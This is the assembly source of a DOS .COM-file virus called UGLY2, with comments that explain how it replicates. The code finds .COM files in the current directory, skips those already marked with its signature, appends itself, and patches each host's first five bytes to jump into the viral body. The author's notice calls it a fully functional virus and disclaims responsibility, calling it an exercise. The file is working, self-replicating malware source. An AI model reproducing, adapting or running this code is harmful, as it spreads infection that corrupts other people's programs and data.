;****************************************************************************
;Title: UGLY2.ASM
;Assembler: MASM 6.11
;Author: ACKME_LABS
;Purpose: A .COM file infector designed as an EXCERSISE in the peculiarities
;of writing self-reproducing code.
;
;DETAILS: I know this virus is very big and "UGLY" and could be written
;better and not as fat-using many other methods, but I wanted to try doing it
;using scaled-indexed addressing just for fun. I learned very much from this
;excersise and got good performance from the "UGLY2" virus. as it is-it could
;still use some "cleaning"-up the only way the virus knows where it is and
;its (and the host's) data is because it writes the host's original file size
;to 101H and scales from that point. also, since I use two types of infection
;addressing methods the virus must know if it is attached to a host or not.
;it does this by checking the offset of label, COMFILE. If the virus were
;executing from 100H, the contents would be 2E2AH, if the virus is attached to
;a host it will be moved to 100H+the host size thus clearing the zero flag-
;lerting the virus that it must reference all of its actions relative to the
;size of its host. basically, that's it
;
;***************************** N O T I C E **********************************
;because this is the source code for a fully functional virus, anyone who
;posseses it is to be completely aware of the harm that it can cause to a
;computer and its data. therefore, those posesing it will assume all
;responsibility and liability for any damage caused by its release at their
;hands or through their negligence. ACKME_LABS, the Author is to remain
;blameless. this source code is intended only as an exercise and exploration
;into the microprocessor and its internal workings. it is the author's intent
;that it not be misused or cause any harm.
;****************************************************************************

.MODEL TINY             ;a .COM file

.CODE                   ;defines the segment

.STARTUP                ;same as ORG 100H-let MASM do it

VIRUS_START:                ;label for start of virus
    JMP VS1         ;JMP over data
DB  0H              ;this is an adjustment 0E9H x BYTE.
DB  'EM'                ;this virus' signature
COMFILE DB  '*.COM',0       ;search string for a comfile

;this initial part of the virus basically figures out whether the virus is
;attached to a host or not. if it is attached to a host it jumps to the
;dynamic addressing mode, otherwise it jumps to static addressing mode.

VS1:    MOV AX,WORD PTR COMFILE ;is virus attached to host? if it is
    CMP AX,2E2AH        ;start of virus will be at 100H
    JZ  STATIC_ADD      ;no so static addressing
    JMP DYN_ADD         ;yes so dynamic addressing mode

DYN_ADD:
    MOV DI,WORD PTR [101H]  ;first set up DI with host's size
    MOV DX,[DI]
    ADD DX,OFFSET DTA+3     ;put DTA in the right place
    CALL    SET_DTA         ;now set it
    MOV DX,[DI]
    ADD DX,OFFSET COMFILE+3 ;add data at start of virus
    CALL    FIND_FIRST      ;find a file
    JMP VS_LOOP0
    JMP TO_HOST

VS_LOOP0:
    OR  AL,AL           ;did DOS return error?
    JNZ TO_HOST         ;yes so exit
    JMP CHK_FILE_DYN        ;is file o.k. to infect?
VSL_10: MOV SI,[DI]         ;be sure and release the handle
    ADD SI,OFFSET HANDLE+3
    MOV BX,[SI]
    MOV AH,3EH          ;be sure and close the file before
    INT 21H         ;opening another one
    MOV AH,4FH          ;DOS function find next file
    INT 21H
    JC  TO_HOST         ;no more files found-exit
    JMP VS_LOOP0        ;did DOS return error?

;*********************** SEE IF INFECTEE IS SUITABLE ************************
CHK_FILE_DYN:
    MOV DX,[DI]         ;DI contains host's size
    ADD DX,OFFSET FNAME+3
    MOV AL,0002H        ;r/w access
    CALL    OPEN_FILE
    MOV SI,[DI]         ;put the HANDLE offset+host's size
    ADD SI,OFFSET HANDLE+3  ;into SI so we can save the file
    MOV [SI],AX         ;handle in the right location
    MOV SI,[DI]         ;now we are moving the file handle
    ADD SI,OFFSET HANDLE+3  ;from HANDLE-in memory to BX. we
    MOV BX,[SI]         ;could just MOV BX,AX but let's learn
    MOV CX,7            ;about addressing. read only 7 bytes
    MOV DX,[DI]         ;scale from [DI]=101H=host's size
    ADD DX,OFFSET VIR_SIG+3 ;place to store 7 bytes
    CALL    READ_FILE
    MOV SI,[DI]         ;now check infectee to see if it is
    ADD SI,OFFSET FSIZE+3   ;too big to infect
    MOV AX,[SI]         ;just more gymnastics
    ADD AX,[DI]
    ADD AX,1000         ;for good measure as a safety margin
    JC  VSL_10          ;its too big, get another file
    MOV SI,[DI]         ;scale from host's size
    ADD SI,OFFSET VIR_SIG+6 ;now locate the 3rd byte in VIR_SIG
    MOV AX,[SI]         ;so we can see if signature is there
    CMP AX,4D45H        ;is virus' signature in place?
    JZ  VSL_10          ;file's already infected get another

;************************* DYNAMIC INFECTION MODE ***************************
INFECT_DYN:
    XOR CX,CX
    MOV DX,CX
    MOV AL,02H          ;move file pointer to end of infectee
    MOV SI,[DI]         ;now we are moving the file handle
    ADD SI,OFFSET HANDLE+3  ;from HANDLE-in memory to BX.
    MOV BX,[SI]         ;we are preparing to write viral code
    CALL    MOVE_POINTER        ;to end of infectee
    MOV CX,OFFSET VIRUS_END-OFFSET VIRUS_START ;size of virus
    MOV DX,[DI]
    ADD DX,OFFSET VIRUS_START+3 ;we want to write from here
    CALL    WRITE_FILE      ;there-virus is appended to infectee
    XOR CX,CX
    MOV SI,[DI]         ;put infectee's size plus the
    ADD SI,OFFSET FSIZE+3   ;location of host_start into DX
    MOV DX,[SI]         ;and move the file pointer
    PUSH    DX          ;save host's size for later
    ADD DX,OFFSET HOST_START-OFFSET VIRUS_START ;to that location
    MOV AL,00H          ;in the infectee file
    MOV SI,[DI]         ;now we are moving the file handle
    ADD SI,OFFSET HANDLE+3  ;from HANDLE-in memory to BX.
    MOV BX,[SI]
    CALL    MOVE_POINTER
    MOV CX,5
    MOV DX,[DI]
    ADD DX,OFFSET VIR_SIG+3 ;write infectee's first 5 bytes to
    CALL    WRITE_FILE      ;the storage area in the virus
    MOV SI,[DI]
    ADD SI,OFFSET VIR_SIG+3
    MOV BYTE PTR [SI],0E9H  ;write the jump to VIR_SIG
    POP AX          ;restore FSIZE, the jump distance
    SUB AX,3            ;don't mess w/SI on our return to
    MOV WORD PTR [SI]+1,AX  ;host- write the jump distance
    MOV WORD PTR [SI]+3,'ME'    ;write the signature
    XOR CX,CX           ;position file pointer to start
    MOV DX,CX
    MOV AL,00H
    CALL    MOVE_POINTER
    MOV DX,[DI]
    ADD DX,OFFSET VIR_SIG+3 ;our buffer
    MOV CX,5
    CALL    WRITE_FILE      ;now write it to the infectee
    MOV AH,3EH          ;close the file
    INT 21H
    MOV SI,[DI]
    ADD SI,OFFSET HANDLE+3  ;put string terminator into HANDLE
    MOV AX,'$'
    MOV [SI],AX
    MOV AH,09H          ;now print the file we just infected
    MOV DX,[DI]
    ADD DX,OFFSET FNAME+3
    INT 21H
    MOV AH,1AH          ;restore the DTA
    MOV DX,80H
    INT 21H
    JMP TO_HOST         ;all done

;**************************** RETURN TO HOST ********************************
TO_HOST:                ;this section of code gets us back
                    ;to the host program by moving the 5
    MOV DI,WORD PTR [101H]  ;bytes of code from HOST_START then
    MOV SI,[DI]         ;jumping to the location in DI, 100H
    ADD SI,OFFSET HOST_START+3  ;don't forget to adjust 0E9H x byte
    MOV CX,5            ;the 5 bytes from HOST_START
    CLD
    MOV DI,100H         ;must execute from 100H
    REP MOVSB           ;put 'em there
    MOV DI,100H         ;the address we are jumping to
    JMP WORD PTR DI     ;now go to 100H and execute host
;************************* END OF DYNAMIC MODE ***************************
;****************************************************************************

;**************************** STATIC INFECTION MODE *************************
STATIC_ADD:
    MOV DX,OFFSET DTA
    CALL    SET_DTA         ;set our new DTA-don't trash DOS's
    MOV DX,OFFSET COMFILE
    CALL    FIND_FIRST      ;find a file
    JMP VS_LOOP1

VS_LOOP1:
    OR  AL,AL           ;did DOS return error?
    JNZ FINISH          ;yes so exit
    JMP CHK_FILE        ;is file o.k. to infect?
VSL_12: MOV AH,4FH          ;DOS function find next file
    INT 21H
    JC  FINISH          ;no more files found-exit
    JMP VS_LOOP1        ;did DOS return error?

CHK_FILE:
    MOV DX,OFFSET FNAME     ;pull filename from the DTA
    MOV AL,0002H        ;r/w access
    CALL    OPEN_FILE
    MOV WORD PTR HANDLE,AX  ;save the file handle
    JC  FINISH          ;if error-exit
    MOV BX,[HANDLE]
    MOV CX,7            ;read only 7 bytes
    MOV DX,OFFSET VIR_SIG   ;place to store 7 bytes
    CALL    READ_FILE
    JC  FINISH          ;if error-exit
    MOV AH,3EH          ;now close the file
    INT 21H         ;the file handle is already in BX
    MOV AX,WORD PTR [FSIZE] ;now see if file is too big to infect
    ADD AX,OFFSET VIRUS_END-OFFSET VIRUS_START
    ADD AX,1000         ;for good measure-survival is the key
    JC  VSL_12          ;it's too big get another
    MOV AX,WORD PTR VIR_SIG+3   ;check for our signature
    CMP AX,'ME'         ;the virus signature reversed in AX
    JZ  VSL_12          ;it's already infected-get another

INFECT:
    MOV DX,OFFSET FNAME
    CALL    OPEN_FILE
    JC  VSL_12          ;if error-find another file
    MOV WORD PTR HANDLE,AX  ;otherwise save handle and continue
    MOV BX,[HANDLE]     ;prepare to read 5 bytes from host
    MOV CX,5
    MOV DX,OFFSET VIR_SIG   ;put the 5 bytes here
    CALL    READ_FILE
    XOR CX,CX           ;move the file pointer to end of
    MOV DX,CX           ;host file
    MOV AL,02H
    CALL    MOVE_POINTER
    MOV BX,[HANDLE]     ;prepare to write virus' code to
    MOV CX,OFFSET VIRUS_END-OFFSET VIRUS_START ;end of host file
    MOV DX,100H         ;virus is here
    CALL    WRITE_FILE
    XOR CX,CX
    MOV DX,OFFSET HOST_START-OFFSET VIRUS_START ;we have to move
    ADD DX,WORD PTR [FSIZE] ;the file pointer to HOST_START
    MOV AL,00H          ;move the pointer from file-start
    CALL    MOVE_POINTER        ;in the host so we can save the
    MOV DX,OFFSET VIR_SIG   ;now write from here
    MOV CX,5
    CALL    WRITE_FILE
    MOV BX,[HANDLE]
    XOR CX,CX
    MOV DX,CX
    MOV AL,00H          ;move the pointer to file-start
    CALL    MOVE_POINTER
    MOV WORD PTR VIR_SIG,0E9H   ;write the jump instruction
    MOV AX,[FSIZE]
    SUB AX,3
    MOV WORD PTR VIR_SIG+1,AX   ;write the distance to jump
    MOV WORD PTR VIR_SIG+3,'ME' ;now write the virus' signature
    MOV DX,OFFSET VIR_SIG   ;now write to host file
    MOV CX,5
    CALL    WRITE_FILE
    MOV DX,OFFSET FNAME     ;print name of newly infected file
    MOV WORD PTR [HANDLE],'$'   ;DOS function 09H, needs terminator
    MOV AH,09H
    INT 21H

    JMP FINISH          ;all done-exit virus

;this is just where all the called routines are placed. they are only
;executed when called

SET_DTA PROC
    MOV AH,1AH          ;DOS function-set DTA
    INT 21H
    RET
SET_DTA ENDP

FIND_FIRST PROC
    MOV AH,4EH          ;DOS function-find first file
    INT 21H
    RET
FIND_FIRST ENDP

OPEN_FILE PROC
    MOV AH,3DH          ;DOS function open file
    MOV AL,0002H        ;r/w/ access
    INT 21H
    RET
OPEN_FILE ENDP

READ_FILE PROC
    MOV AH,3FH          ;DOS function-read file
    INT 21H
    RET
READ_FILE ENDP

WRITE_FILE PROC
    MOV AH,40H          ;DOS function-write file
    INT 21H
    RET
WRITE_FILE ENDP

MOVE_POINTER PROC
    MOV AH,42H          ;DOS function-move file pointer
    INT 21H
    RET
MOVE_POINTER ENDP

FINISH:
    MOV AX,4C00H
    INT 21H

HOST_START:             ;a place to store the start code of
DB  'A'             ;original host. these 5 bytes will
DB  'C'             ;be moved to the start of the host
DB  'K'             ;at 100H, after the virus is done
DB  'M'             ;doing its work
DB  'E'

DTA DB  22 DUP(?)       ;work area for the search function
FTIME   DB  0,0         ;time of original creation
FDATE   DB  0,0         ;date of original creation
FSIZE   DW  0,0         ;file size storage area
FNAME   DB  13 DUP(?)       ;area for file path
HANDLE  DW  0           ;file handle
VIR_SIG DB  0,0,0,0,0       ;storage for first 5 bytes of host
                    ;and jump distances
VIRUS_END:              ;label for end of virus

END
